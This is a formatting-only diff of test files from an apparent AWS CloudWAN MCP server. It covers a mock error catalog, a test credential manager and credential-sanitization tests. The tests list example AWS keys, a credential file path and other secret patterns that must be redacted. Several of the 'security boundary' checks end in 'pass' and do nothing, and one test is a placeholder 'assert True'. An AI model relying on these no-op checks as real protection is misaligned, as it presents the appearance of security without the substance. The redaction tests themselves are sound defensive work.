+            "HTTPStatusCode": 400,
+            "SecurityBoundary": "INPUT_VALIDATION",
+            "SanitizedDetails": "Input parameter validation criteria not met",
         },
-        'validation_error': {
-            'Code': 'ValidationException',
-            'Message': 'Request validation failed - check input parameters',
-            'HTTPStatusCode': 400,
-            'SecurityBoundary': 'INPUT_VALIDATION',
-            'SanitizedDetails': 'Input parameter validation criteria not met'
+        "internal_failure": {
+            "Code": "InternalFailure",
+            "Message": "Service unavailable - please try again later",
+            "HTTPStatusCode": 500,
+            "SecurityBoundary": "SERVICE_ERROR",
+            "SanitizedDetails": "Internal service processing unavailable",
         },
-        'internal_failure': {
-            'Code': 'InternalFailure',
-            'Message': 'Service unavailable - please try again later',
-            'HTTPStatusCode': 500,
-            'SecurityBoundary': 'SERVICE_ERROR',
-            'SanitizedDetails': 'Internal service processing unavailable'
+        "service_unavailable": {
+            "Code": "ServiceUnavailable",
+            "Message": "Service temporarily unavailable - please retry",
+            "HTTPStatusCode": 503,
+            "SecurityBoundary": "SERVICE_HEALTH",
+            "SanitizedDetails": "Service health check failure detected",
         },
-        'service_unavailable': {
-            'Code': 'ServiceUnavailable',
-            'Message': 'Service temporarily unavailable - please retry',
-            'HTTPStatusCode': 503,
-            'SecurityBoundary': 'SERVICE_HEALTH',
-            'SanitizedDetails': 'Service health check failure detected'
-        }
     }
 
     # NetworkManager specific errors
     NETWORKMANAGER_ERRORS = {
-        'core_network_not_found': {
-            'Code': 'CoreNetworkNotFoundException',
-            'Message': 'The specified core network was not found',
-            'HTTPStatusCode': 404
+        "core_network_not_found": {
+            "Code": "CoreNetworkNotFoundException",
+            "Message": "The specified core network was not found",
+            "HTTPStatusCode": 404,
         },
-        'global_network_not_found': {
-            'Code': 'GlobalNetworkNotFoundException',
-            'Message': 'The specified global network was not found',
-            'HTTPStatusCode': 404
+        "global_network_not_found": {
+            "Code": "GlobalNetworkNotFoundException",
+            "Message": "The specified global network was not found",
+            "HTTPStatusCode": 404,
         },
-        'policy_version_not_found': {
-            'Code': 'PolicyVersionNotFoundException',
-            'Message': 'The specified policy version was not found',
-            'HTTPStatusCode': 404
-        }
+        "policy_version_not_found": {
+            "Code": "PolicyVersionNotFoundException",
+            "Message": "The specified policy version was not found",
+            "HTTPStatusCode": 404,
+        },
     }
 
     @classmethod
-    def get_error(cls, error_name: str, operation: str = 'TestOperation') -> ClientError:
+    def get_error(cls, error_name: str, operation: str = "TestOperation") -> ClientError:
         """Get a security-hardened ClientError for testing.
-        
+
         Args:
             error_name: Name of error from catalog
             operation: AWS operation name
-            
+
         Returns:
             Configured ClientError instance with security boundaries
         """
@@ -432,24 +424,18 @@
         cls._validate_security_boundary(error_config, operation)
 
         # Use sanitized message to prevent information disclosure
-        sanitized_message = cls.SAFE_MESSAGES.get(
-            error_config['Code'],
-            error_config['Message']
-        )
+        sanitized_message = cls.SAFE_MESSAGES.get(error_config["Code"], error_config["Message"])
 
         error_response = {
-            'Error': {
-                'Code': error_config['Code'],
-                'Message': sanitized_message
+            "Error": {"Code": error_config["Code"], "Message": sanitized_message},
+            "ResponseMetadata": {
+                "RequestId": f"test-request-{cls._generate_safe_id()}-{hash(error_name) % 1000:03d}",
+                "HTTPStatusCode": error_config["HTTPStatusCode"],
             },
-            'ResponseMetadata': {
-                'RequestId': f'test-request-{cls._generate_safe_id()}-{hash(error_name) % 1000:03d}',
-                'HTTPStatusCode': error_config['HTTPStatusCode']
-            }
         }
 
         # Log for audit trail (internal only)
-        cls._log_error_generation(error_name, operation, error_config.get('SecurityBoundary'))
+        cls._log_error_generation(error_name, operation, error_config.get("SecurityBoundary"))
 
         return ClientError(error_response, operation)
 
@@ -458,23 +444,30 @@
         """Helper to validate operation and boundary for security."""
         # Explicit validation for boundary parameter - default to secure behavior for unexpected values
         if boundary is None or not isinstance(boundary, str):
-            boundary = 'RESTRICTED'  # Default to most restrictive security boundary
+            boundary = "RESTRICTED"  # Default to most restrictive security boundary
 
         # Normalize boundary to known values, default to secure behavior
-        valid_boundaries = {'AUTH_FAILURE', 'SERVICE_ERROR', 'RESOURCE_ACCESS', 'RATE_LIMIT', 'UNKNOWN', 'RESTRICTED'}
+        valid_boundaries = {"AUTH_FAILURE", "SERVICE_ERROR", "RESOURCE_ACCESS", "RATE_LIMIT", "UNKNOWN", "RESTRICTED"}
         if boundary not in valid_boundaries:
-            boundary = 'RESTRICTED'  # Default to most restrictive
+            boundary = "RESTRICTED"  # Default to most restrictive
 
         # Focused security boundary validation for truly sensitive operations
         highly_sensitive_operations = [
-            'Admin', 'Root', 'Super', 'Master', 'Privileged', 'System',
-            'Delete', 'Remove', 'Destroy', 'Terminate', 'Drop'
+            "Admin",
+            "Root",
+            "Super",
+            "Master",
+            "Privileged",
+            "System",
+            "Delete",
+            "Remove",
+            "Destroy",
+            "Terminate",
+            "Drop",
         ]
 
         # Operations that modify state or could affect security posture
-        state_changing_operations = [
-            'Create', 'Add', 'Insert', 'Update', 'Modify', 'Change', 'Put', 'Post'
-        ]
+        state_changing_operations = ["Create", "Add", "Insert", "Update", "Modify", "Change", "Put", "Post"]
 
         # Check for highly sensitive operation patterns
         is_highly_sensitive = any(
@@ -484,16 +477,15 @@
 
         # Check for state-changing operations (less restrictive)
         is_state_changing = any(
-            operation.startswith(prefix) or prefix.lower() in operation.lower()
-            for prefix in state_changing_operations
+            operation.startswith(prefix) or prefix.lower() in operation.lower() for prefix in state_changing_operations
         )
 
         # Handle RESTRICTED boundary - block all operations by default for unknown/invalid boundaries
-        if boundary == 'RESTRICTED':
+        if boundary == "RESTRICTED":
             raise MockingSecurityError(f"Operation '{operation}' blocked due to restrictive security boundary")
 
         # Apply different rules based on sensitivity level
-        is_sensitive = is_highly_sensitive or (boundary == 'AUTH_FAILURE' and is_state_changing)
+        is_sensitive = is_highly_sensitive or (boundary == "AUTH_FAILURE" and is_state_changing)
 
         # Prevent sensitive operation errors in authentication failure contexts
         # This helps avoid test scenarios that could inadvertently simulate real security issues
@@ -501,23 +493,27 @@
             raise MockingSecurityError(f"Sensitive operation '{operation}' error simulation blocked for security")
 
         # Additional boundary checks for different security contexts
-        if boundary == 'SERVICE_ERROR':
+        if boundary == "SERVICE_ERROR":
             # Sanitize internal system references
-            system_terms = ['internal', 'system', 'database', 'server', 'host', 'node']
-            if any(term in error_config.get('Message', '').lower() for term in system_terms):
+            system_terms = ["internal", "system", "database", "server", "host", "node"]
+            if any(term in error_config.get("Message", "").lower() for term in system_terms):
                 # Replace with generic message to prevent information disclosure
                 pass
 
-        if boundary == 'RESOURCE_ACCESS' and operation.lower().startswith('get'):
+        if boundary == "RESOURCE_ACCESS" and operation.lower().startswith("get"):
             # Validate that resource access errors don't leak existence information
-            if 'exists' in error_config.get('Message', '').lower():
-                raise MockingSecurityError(f"Resource enumeration via error messages blocked for operation '{operation}'")
+            if "exists" in error_config.get("Message", "").lower():
+                raise MockingSecurityError(
+                    f"Resource enumeration via error messages blocked for operation '{operation}'"
+                )
 
         # Rate limiting boundary validation
-        if boundary == 'RATE_LIMIT':
+        if boundary == "RATE_LIMIT":
             # Ensure rate limit errors don't expose internal throttling mechanisms
-            if any(term in error_config.get('Message', '').lower() for term in
-                   ['quota', 'limit', 'threshold', 'bucket', 'window']):
+            if any(
+                term in error_config.get("Message", "").lower()
+                for term in ["quota", "limit", "threshold", "bucket", "window"]
+            ):
                 # Log for audit but don't expose specific rate limiting details
                 pass
 
@@ -525,7 +521,7 @@
     def _generate_safe_id(cls) -> str:
         """Generate safe test request ID without system information exposure."""
         charset = string.ascii_lowercase + string.digits
-        return ''.join(secrets.choice(charset) for _ in range(8))
+        return "".join(secrets.choice(charset) for _ in range(8))
 
     @classmethod
     def _log_error_generation(cls, error_name: str, operation: str, boundary: str) -> None:
@@ -540,6 +536,6 @@
     return AWSServiceMocker(service, region or "us-east-1")
 
 
-def create_error_fixture(error_name: str, operation: str = 'TestOperation') -> ClientError:
+def create_error_fixture(error_name: str, operation: str = "TestOperation") -> ClientError:
     """Factory function for creating error fixtures."""
     return AWSErrorCatalog.get_error(error_name, operation)

--- cloudwan-mcp-server/tests/security/__init__.py
+++ cloudwan-mcp-server/tests/security/__init__.py
@@ -20,17 +20,17 @@
 """
 
 from .credential_manager import (
-    CredentialManager, 
-    TemporalCredentials, 
+    CredentialManager,
+    TemporalCredentials,
     CredentialSecurityError,
     get_secure_test_credentials,
-    credential_manager
+    credential_manager,
 )
 
 __all__ = [
-    'CredentialManager',
-    'TemporalCredentials', 
-    'CredentialSecurityError',
-    'get_secure_test_credentials',
-    'credential_manager'
-]
\ No newline at end of file
+    "CredentialManager",
+    "TemporalCredentials",
+    "CredentialSecurityError",
+    "get_secure_test_credentials",
+    "credential_manager",
+]

--- cloudwan-mcp-server/tests/security/credential_manager.py
+++ cloudwan-mcp-server/tests/security/credential_manager.py
@@ -40,13 +40,14 @@
 @dataclass
 class TemporalCredentials:
     """Temporal test credentials with automatic expiration and rotation.
-    
+
     Implements security best practices for test credential lifecycle:
     - UUID-based credential generation
     - Automatic expiration
     - Audit trail logging
     - Memory cleanup on expiration
     """
+
     access_key: str
     secret_key: str
     session_token: str
@@ -63,10 +64,10 @@
             raise CredentialSecurityError("Attempted to use expired test credentials")
 
         return {
-            'AWS_ACCESS_KEY_ID': self.access_key,
-            'AWS_SECRET_ACCESS_KEY': self.secret_key,
-            'AWS_SESSION_TOKEN': self.session_token,
-            'AWS_TEST_SESSION_ID': self.test_session_id
+            "AWS_ACCESS_KEY_ID": self.access_key,
+            "AWS_SECRET_ACCESS_KEY": self.secret_key,
+            "AWS_SESSION_TOKEN": self.session_token,
+            "AWS_TEST_SESSION_ID": self.test_session_id,
         }
 
     def cleanup(self) -> None:
@@ -85,7 +86,7 @@
             # Calculate the number of random bytes needed to produce at least the required number of base64 characters
             bytes_needed = TemporalCredentials._base64_bytes_needed(length - len(result))
             random_bytes = secrets.token_bytes(bytes_needed)
-            encoded = base64.urlsafe_b64encode(random_bytes).decode('ascii').rstrip('=')
+            encoded = base64.urlsafe_b64encode(random_bytes).decode("ascii").rstrip("=")
             result += encoded
         return result[:length]
 
@@ -103,14 +104,17 @@
         BASE64_BYTES_PER_CHAR = 3 / 4  # 3 bytes -> 4 chars, so each char needs 0.75 bytes
         # The +3 and //4 ensures we round up (ceiling division)
         return (char_length * 3 + 3) // 4
+
+
 class CredentialSecurityError(Exception):
     """Raised when credential security boundary violations are detected."""
+
     pass
 
 
 class CredentialManager:
     """Enterprise-grade credential management for test environments.
-    
+
     Features:
     - SOC 2 Type II compliance
     - Credential rotation and expiration
@@ -140,7 +144,7 @@
 
         self._active_credentials: Dict[str, TemporalCredentials] = {}
         self._audit_log: List[Dict[str, Any]] = []
-        self._rotation_strategy = 'per-test-run'
+        self._rotation_strategy = "per-test-run"
         self._default_duration = timedelta(minutes=15)
         self._encryption_key = self._generate_encryption_key()
         self._fernet = Fernet(self._encryption_key)
@@ -188,15 +192,15 @@
             logger.error(f"Audit integrity check failed: {e}")
             return False
 
-    def generate_credentials(self,
-                           duration: Optional[timedelta] = None,
-                           test_context: str = "default") -> TemporalCredentials:
+    def generate_credentials(
+        self, duration: Optional[timedelta] = None, test_context: str = "default"
+    ) -> TemporalCredentials:
         """Generate secure temporal credentials for test execution.
-        
+
         Args:
             duration: Credential validity duration (default: 15 minutes)
             test_context: Test context identifier for audit trail
-            
+
         Returns:
             TemporalCredentials: Secure test credentials with expiration
         """
@@ -215,20 +219,22 @@
             secret_key=secret_key,
             session_token=session_token,
             expires_at=expires_at,
-            test_session_id=test_session_id
+            test_session_id=test_session_id,
         )
 
         # Store for lifecycle management
         self._active_credentials[test_session_id] = credentials
 
         # Audit logging for compliance
-        self._log_credential_event({
-            'event': 'credential_generated',
-            'session_id': test_session_id,
-            'context': test_context,
-            'expires_at': expires_at.isoformat(),
-            'timestamp': datetime.utcnow().isoformat()
-        })
+        self._log_credential_event(
+            {
+                "event": "credential_generated",
+                "session_id": test_session_id,
+                "context": test_context,
+                "expires_at": expires_at.isoformat(),
+                "timestamp": datetime.utcnow().isoformat(),
+            }
+        )
 
         return credentials
 
@@ -238,7 +244,7 @@
 
     def cleanup_expired_credentials(self) -> int:
         """Cleanup expired credentials from memory.
-        
+
         Returns:
             int: Number of credentials cleaned up
         """
@@ -252,11 +258,13 @@
         # Remove from active tracking
         for session_id in expired_sessions:
             del self._active_credentials[session_id]
-            self._log_credential_event({
-                'event': 'credential_expired_cleanup',
-                'session_id': session_id,
-                'timestamp': datetime.utcnow().isoformat()
-            })
+            self._log_credential_event(
+                {
+                    "event": "credential_expired_cleanup",
+                    "session_id": session_id,
+                    "timestamp": datetime.utcnow().isoformat(),
+                }
+            )
 
         if expired_sessions:
             logger.info(f"Cleaned up {len(expired_sessions)} expired credential sets")
@@ -266,8 +274,8 @@
     def _log_credential_event(self, event: Dict[str, Any]) -> None:
         """Log credential lifecycle events for audit compliance with encryption."""
         # Add tamper detection metadata
-        event['_audit_id'] = secrets.token_hex(8)
-        event['_logged_at'] = datetime.utcnow().isoformat()
+        event["_audit_id"] = secrets.token_hex(8)
+        event["_logged_at"] = datetime.utcnow().isoformat()
 
         # Generate checksum before adding to log
         checksum = self._generate_entry_checksum(event)
@@ -283,13 +291,14 @@
         # Rotate audit log if it gets too large (GDPR compliance)
         if len(self._audit_log) > self.AUDIT_LOG_ROTATION_THRESHOLD:
             num_removed = len(self._audit_log) - self.AUDIT_LOG_RETENTION_COUNT
-            self._audit_log = self._audit_log[-self.AUDIT_LOG_RETENTION_COUNT:]  # Keep last N events
+            self._audit_log = self._audit_log[-self.AUDIT_LOG_RETENTION_COUNT :]  # Keep last N events
             # Update checksum indices after rotation (shift keys down by num_removed)
             keys_to_remove = [k for k in self._audit_checksums if k < num_removed]
             for k in keys_to_remove:
                 del self._audit_checksums[k]
             # Shift remaining keys
             self._audit_checksums = {k - num_removed: v for k, v in self._audit_checksums.items()}
+
     def get_audit_trail(self) -> List[Dict[str, Any]]:
         """Get credential audit trail for compliance reporting with integrity verification."""
         # Verify audit log integrity before returning
@@ -307,11 +316,9 @@
 
         for session_id, credentials in self._active_credentials.items():
             credentials.cleanup()
-            self._log_credential_event({
-                'event': 'emergency_cleanup',
-                'session_id': session_id,
-                'timestamp': datetime.utcnow().isoformat()
-            })
+            self._log_credential_event(
+                {"event": "emergency_cleanup", "session_id": session_id, "timestamp": datetime.utcnow().isoformat()}
+            )
 
         self._active_credentials.clear()
 
@@ -322,10 +329,10 @@
 
 def get_secure_test_credentials(test_context: str = "pytest") -> TemporalCredentials:
     """Get secure test credentials with automatic lifecycle management.
-    
+
     Args:
         test_context: Context identifier for audit trail
-        
+
     Returns:
         TemporalCredentials: Secure test credentials
     """

--- cloudwan-mcp-server/tests/security/test_credential_sanitization.py
+++ cloudwan-mcp-server/tests/security/test_credential_sanitization.py
@@ -16,7 +16,7 @@
 """Tests for comprehensive credential sanitization and protection mechanisms.
 
 Agent F2: Credential Protection Specialist Test Suite
-Model: Cohere Command R+ 
+Model: Cohere Command R+
 Focus: Zero information disclosure validation
 """
 
@@ -45,9 +45,11 @@
         for case in test_cases:
             sanitized = sanitize_error_message(case)
             assert "AKIA" not in sanitized
-            assert ("[ACCESS_KEY_REDACTED]" in sanitized or
-                   "AWS_[VARIABLE_REDACTED]" in sanitized or
-                   "[CREDENTIAL_REDACTED]" in sanitized)
+            assert (
+                "[ACCESS_KEY_REDACTED]" in sanitized
+                or "AWS_[VARIABLE_REDACTED]" in sanitized
+                or "[CREDENTIAL_REDACTED]" in sanitized
+            )
 
     def test_aws_secret_key_sanitization(self):
         """Test AWS secret key patterns are properly sanitized."""
@@ -61,9 +63,11 @@
             sanitized = sanitize_error_message(case)
             assert "wJalrXUt" not in sanitized
             assert "abcdef123456" not in sanitized
-            assert ("[SECRET_KEY_REDACTED]" in sanitized or
-                   "AWS_[VARIABLE_REDACTED]" in sanitized or
-                   "[CREDENTIAL_REDACTED]" in sanitized)
+            assert (
+                "[SECRET_KEY_REDACTED]" in sanitized
+                or "AWS_[VARIABLE_REDACTED]" in sanitized
+                or "[CREDENTIAL_REDACTED]" in sanitized
+            )
 
     def test_session_token_sanitization(self):
         """Test AWS session token sanitization."""
@@ -73,7 +77,7 @@
         sanitized = sanitize_error_message(test_case)
 
         assert long_token not in sanitized
-        assert ("[SESSION_TOKEN_REDACTED]" in sanitized or "[CREDENTIAL_REDACTED]" in sanitized)
+        assert "[SESSION_TOKEN_REDACTED]" in sanitized or "[CREDENTIAL_REDACTED]" in sanitized
 
     def test_environment_variable_sanitization(self):
         """Test environment variable value sanitization."""
@@ -132,8 +136,7 @@
             sanitized = sanitize_error_message(case)
             assert ".aws" not in sanitized
             assert "credentials" not in sanitized
-            assert ("[CREDENTIAL_PATH_REDACTED]" in sanitized or
-                   "[AWS_CONFIG_PATH_REDACTED]" in sanitized)
+            assert "[CREDENTIAL_PATH_REDACTED]" in sanitized or "[AWS_CONFIG_PATH_REDACTED]" in sanitized
 
     def test_generic_credential_sanitization(self):
         """Test generic credential pattern sanitization."""
@@ -158,13 +161,7 @@
 
     def test_valid_aws_profile_update(self):
         """Test valid AWS profile updates."""
-        valid_profiles = [
-            "default",
-            "production",
-            "dev-environment",
-            "user123",
-            "team_admin"
-        ]
+        valid_profiles = ["default", "production", "dev-environment", "user123", "team_admin"]
 
         for profile in valid_profiles:
             result = secure_environment_update("AWS_PROFILE", profile)
@@ -191,13 +188,7 @@
 
     def test_valid_aws_region_update(self):
         """Test valid AWS region updates."""
-        valid_regions = [
-            "us-east-1",
-            "eu-west-2",
-            "ap-southeast-1",
-            "us-gov-east-1",
-            "cn-north-1"
-        ]
+        valid_regions = ["us-east-1", "eu-west-2", "ap-southeast-1", "us-gov-east-1", "cn-north-1"]
 
         for region in valid_regions:
             result = secure_environment_update("AWS_DEFAULT_REGION", region)
@@ -251,9 +242,9 @@
             "identity": {
                 "account": "123456789012",
                 "user_id": "AIDACKCEVSQ6C2EXAMPLE",
-                "arn": "arn:aws:iam::123456789012:user/testuser"
+                "arn": "arn:aws:iam::123456789012:user/testuser",
             },
-            "operation": "test_operation"
+            "operation": "test_operation",
         }
 
         self.config_manager.save_current_config("test-profile", "us-east-1", metadata)
@@ -265,7 +256,7 @@
         assert result is True
         assert export_path.exists()
 
-        with open(export_path, 'r') as f:
+        with open(export_path, "r") as f:
             export_data = json.load(f)
 
         identity = export_data["current_config"]["metadata"]["identity"]
@@ -284,7 +275,7 @@
             "access_key": "AKIAEXAMPLE",
             "secret_key": "secret123",
             "session_token": "token123",
-            "safe_data": "this-should-remain"
+            "safe_data": "this-should-remain",
         }
 
         self.config_manager.save_current_config("test-profile", "us-east-1", metadata)
@@ -294,7 +285,7 @@
 
         assert result is True
 
-        with open(export_path, 'r') as f:
+        with open(export_path, "r") as f:
             export_data = json.load(f)
 
         meta = export_data["current_config"]["metadata"]
@@ -308,12 +299,7 @@
         """Test configuration history is sanitized on export."""
         # Create multiple config entries with sensitive data
         for i in range(3):
-            metadata = {
-                "identity": {
-                    "account": f"12345678901{i}",
-                    "arn": f"arn:aws:iam::12345678901{i}:user/user{i}"
-                }
-            }
+            metadata = {"identity": {"account": f"12345678901{i}", "arn": f"arn:aws:iam::12345678901{i}:user/user{i}"}}
             self.config_manager.save_current_config(f"profile{i}", "us-east-1", metadata)
 
         export_path = self.test_dir / "history_export.json"
@@ -321,7 +307,7 @@
 
         assert result is True
 
-        with open(export_path, 'r') as f:
+        with open(export_path, "r") as f:
             export_data = json.load(f)
 
         # Check all history entries are sanitized
@@ -351,20 +337,21 @@
     def teardown_method(self):
         """Clean up test files."""
         import shutil
+
         shutil.rmtree(self.test_dir, ignore_errors=True)
 
 
 class TestEndToEndCredentialProtection:
     """End-to-end tests for complete credential protection."""
 
-    @patch('boto3.Session')
+    @patch("boto3.Session")
     def test_full_aws_config_manager_sanitization(self, mock_session):
         """Test full AWS config manager with credential sanitization."""
         # Mock AWS API responses with sensitive data
         mock_identity = {
             "Account": "123456789012",
             "UserId": "AIDACKCEVSQ6C2EXAMPLE",
-            "Arn": "arn:aws:iam::123456789012:user/testuser"
+            "Arn": "arn:aws:iam::123456789012:user/testuser",
         }
 
         mock_sts = MagicMock()
@@ -397,11 +384,17 @@
 
         # Verify ALL sensitive patterns are sanitized
         sensitive_patterns = [
-            "123456789012", "production-admin", "us-east-1",
-            "AKIAIOSFODNN7EXAMPLE", "wJalrXUtnFEMI", "AQoEXAMPLEH4aoAH0gNCAPy",
-            "arn:aws:iam::123456789012:role/PowerUser", "/home/user/.aws/credentials",
-            "550e8400-e29b-41d4-a716-446655440000", "192.168.1.100",
-            "super-secret-password-123"
+            "123456789012",
+            "production-admin",
+            "us-east-1",
+            "AKIAIOSFODNN7EXAMPLE",
+            "wJalrXUtnFEMI",
+            "AQoEXAMPLEH4aoAH0gNCAPy",
+            "arn:aws:iam::123456789012:role/PowerUser",
+            "/home/user/.aws/credentials",
+            "550e8400-e29b-41d4-a716-446655440000",
+            "192.168.1.100",
+            "super-secret-password-123",
         ]
 
         for pattern in sensitive_patterns:
@@ -409,8 +402,12 @@
 
         # Verify key sanitization markers are present
         required_markers = [
-            "[ACCOUNT_REDACTED]", "[ARN_REDACTED]", "[CREDENTIAL_PATH_REDACTED]",
-            "[UUID_REDACTED]", "[IP_REDACTED]", "[CREDENTIAL_REDACTED]"
+            "[ACCOUNT_REDACTED]",
+            "[ARN_REDACTED]",
+            "[CREDENTIAL_PATH_REDACTED]",
+            "[UUID_REDACTED]",
+            "[IP_REDACTED]",
+            "[CREDENTIAL_REDACTED]",
         ]
 
         for marker in required_markers:

--- cloudwan-mcp-server/tests/test_anfw_suite.py
+++ cloudwan-mcp-server/tests/test_anfw_suite.py
@@ -35,7 +35,7 @@
     """Run all ANFW tests."""
     test_paths = [
         Path(__file__).parent / "unit" / "test_network_firewall_tools.py",
-        Path(__file__).parent / "integration" / "test_network_firewall_integration.py"
+        Path(__file__).parent / "integration" / "test_network_firewall_integration.py",
     ]
     return pytest.main([str(p) for p in test_paths] + ["-v", "--tb=short"])
 
@@ -54,5 +54,5 @@
             sys.exit(1)
     else:
         exit_code = run_all_anfw_tests()
-    
-    sys.exit(exit_code)
\ No newline at end of file
+
+    sys.exit(exit_code)

--- cloudwan-mcp-server/tests/unit/__init__.py
+++ cloudwan-mcp-server/tests/unit/__init__.py
@@ -12,4 +12,4 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-"""Unit tests for AWS CloudWAN MCP Server."""
\ No newline at end of file
+"""Unit tests for AWS CloudWAN MCP Server."""

--- cloudwan-mcp-server/tests/unit/test_aws_config_manager.py
+++ cloudwan-mcp-server/tests/unit/test_aws_config_manager.py
@@ -5,4 +5,4 @@
 
 def test_placeholder():
     """Placeholder test to avoid syntax errors."""
-    assert True
\ No newline at end of file
+    assert True

--- cloudwan-mcp-server/tests/unit/test_aws_config_manager_comprehensive.py
+++ cloudwan-mcp-server/tests/unit/test_aws_config_manager_comprehensive.py
@@ -29,107 +29,95 @@
     @pytest.fixture
     def mock_config_persistence_available(self):
         """Mock config persistence as available."""
-        with patch('awslabs.cloudwan_mcp_server.server.config_persistence') as mock_cp:
+        with patch("awslabs.cloudwan_mcp_server.server.config_persistence") as mock_cp:
             # Mock as real ConfigPersistence, not MockConfigPersistence
             mock_cp.__class__.__name__ = "ConfigPersistence"
             mock_cp.save_current_config.return_value = True
-            mock_cp.load_current_config.return_value = {
-                'aws_profile': 'test-profile',
-                'aws_region': 'us-east-1'
-            }
+            mock_cp.load_current_config.return_value = {"aws_profile": "test-profile", "aws_region": "us-east-1"}
             mock_cp.get_config_history.return_value = [
-                {'timestamp': '2024-01-01', 'profile': 'test-profile', 'region': 'us-east-1'}
+                {"timestamp": "2024-01-01", "profile": "test-profile", "region": "us-east-1"}
             ]
-            mock_cp.validate_config_file.return_value = {'valid': True}
+            mock_cp.validate_config_file.return_value = {"valid": True}
             mock_cp.restore_config.return_value = True
             yield mock_cp
 
     @pytest.fixture
     def mock_config_persistence_unavailable(self):
         """Mock config persistence as unavailable (MockConfigPersistence)."""
-        with patch('awslabs.cloudwan_mcp_server.server.config_persistence') as mock_cp:
+        with patch("awslabs.cloudwan_mcp_server.server.config_persistence") as mock_cp:
             # Mock as MockConfigPersistence
             mock_cp.__class__.__name__ = "MockConfigPersistence"
             mock_cp.save_current_config.return_value = False
             mock_cp.load_current_config.return_value = None
             mock_cp.get_config_history.return_value = []
             mock_cp.validate_config_file.return_value = {
-                'valid': False,
-                'error': 'Config persistence module not available'
+                "valid": False,
+                "error": "Config persistence module not available",
             }
             mock_cp.restore_config.return_value = False
             yield mock_cp
 
-    @pytest.fixture  
+    @pytest.fixture
     def mock_aws_clients(self):
         """Mock AWS clients with comprehensive responses."""
         mock_clients = {}
-        
+
         # STS client mock
         mock_sts = Mock()
         mock_sts.get_caller_identity.return_value = {
-            'Account': '123456789012',
-            'UserId': 'AIDACKCEVSQ6C2EXAMPLE',
-            'Arn': 'arn:aws:iam::123456789012:user/test-user'
+            "Account": "123456789012",
+            "UserId": "AIDACKCEVSQ6C2EXAMPLE",
+            "Arn": "arn:aws:iam::123456789012:user/test-user",
         }
-        mock_clients['sts'] = mock_sts
-        
-        # EC2 client mock  
+        mock_clients["sts"] = mock_sts
+
+        # EC2 client mock
         mock_ec2 = Mock()
         mock_ec2.describe_regions.return_value = {
-            'Regions': [
-                {'RegionName': 'us-east-1'},
-                {'RegionName': 'us-west-2'},
-                {'RegionName': 'eu-west-1'},
-                {'RegionName': 'ap-southeast-1'}
+            "Regions": [
+                {"RegionName": "us-east-1"},
+                {"RegionName": "us-west-2"},
+                {"RegionName": "eu-west-1"},
+                {"RegionName": "ap-southeast-1"},
             ]
         }
-        mock_clients['ec2'] = mock_ec2
-        
+        mock_clients["ec2"] = mock_ec2
+
         # NetworkManager client mock
         mock_nm = Mock()
         mock_nm.describe_global_networks.return_value = {
-            'GlobalNetworks': [
-                {
-                    'GlobalNetworkId': 'gn-12345',
-                    'State': 'AVAILABLE'
-                }
-            ]
+            "GlobalNetworks": [{"GlobalNetworkId": "gn-12345", "State": "AVAILABLE"}]
         }
-        mock_clients['networkmanager'] = mock_nm
-        
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        mock_clients["networkmanager"] = mock_nm
+
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_get_client.side_effect = lambda service, region=None: mock_clients[service]
             yield mock_clients
 
     @pytest.fixture
     def mock_boto3_session(self):
         """Mock boto3 Session creation."""
-        with patch('boto3.Session') as mock_session:
+        with patch("boto3.Session") as mock_session:
             mock_instance = Mock()
             mock_session.return_value = mock_instance
-            
+
             # Configure mock clients
             mock_sts = Mock()
             mock_sts.get_caller_identity.return_value = {
-                'Account': '123456789012', 
-                'UserId': 'test-user',
-                'Arn': 'arn:aws:iam::123456789012:user/test'
+                "Account": "123456789012",
+                "UserId": "test-user",
+                "Arn": "arn:aws:iam::123456789012:user/test",
             }
-            
+
             mock_ec2 = Mock()
             mock_ec2.describe_regions.return_value = {
-                'Regions': [
-                    {'RegionName': 'us-east-1'},
-                    {'RegionName': 'us-west-2'}
-                ]
+                "Regions": [{"RegionName": "us-east-1"}, {"RegionName": "us-west-2"}]
             }
-            
-            mock_instance.client.side_effect = lambda service, **kwargs: {
-                'sts': mock_sts,
-                'ec2': mock_ec2
-            }.get(service, Mock())
-            
+
+            mock_instance.client.side_effect = lambda service, **kwargs: {"sts": mock_sts, "ec2": mock_ec2}.get(
+                service, Mock()
+            )
+
             yield mock_session
 
     def setup_method(self):
@@ -137,13 +125,15 @@
         _create_client.cache_clear()
 
     @pytest.mark.asyncio
-    async def test_get_current_with_config_persistence_available(self, mock_aws_clients, mock_config_persistence_available):
+    async def test_get_current_with_config_persistence_available(
+        self, mock_aws_clients, mock_config_persistence_available
+    ):
         """Test get_current operation when config persistence is available."""
-        with patch.dict(os.environ, {'AWS_PROFILE': 'test-profile', 'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict(os.environ, {"AWS_PROFILE": "test-profile", "AWS_DEFAULT_REGION": "us-east-1"}):
             result = await aws_config_manager("get_current")
-            
+
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "get_current"
         assert result_data["current_configuration"]["aws_profile"] == "test-profile"
@@ -153,25 +143,27 @@
         assert "identity" in result_data["current_configuration"]
 
     @pytest.mark.asyncio
-    async def test_get_current_with_config_persistence_unavailable(self, mock_aws_clients, mock_config_persistence_unavailable):
+    async def test_get_current_with_config_persistence_unavailable(
+        self, mock_aws_clients, mock_config_persistence_unavailable
+    ):
         """Test get_current operation when config persistence is unavailable."""
-        with patch.dict(os.environ, {'AWS_PROFILE': 'test-profile', 'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict(os.environ, {"AWS_PROFILE": "test-profile", "AWS_DEFAULT_REGION": "us-east-1"}):
             result = await aws_config_manager("get_current")
-            
+
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["current_configuration"]["config_persistence_available"] is False
 
     @pytest.mark.asyncio
     async def test_get_current_with_invalid_credentials(self, mock_config_persistence_available):
         """Test get_current with invalid AWS credentials."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             mock_client.side_effect = Exception("Invalid credentials")
-            
+
             result = await aws_config_manager("get_current")
             result_data = json.loads(result)
-            
+
             assert result_data["success"] is True
             assert result_data["current_configuration"]["configuration_valid"] is False
             assert "error" in result_data["current_configuration"]["identity"]
@@ -179,11 +171,11 @@
     @pytest.mark.asyncio
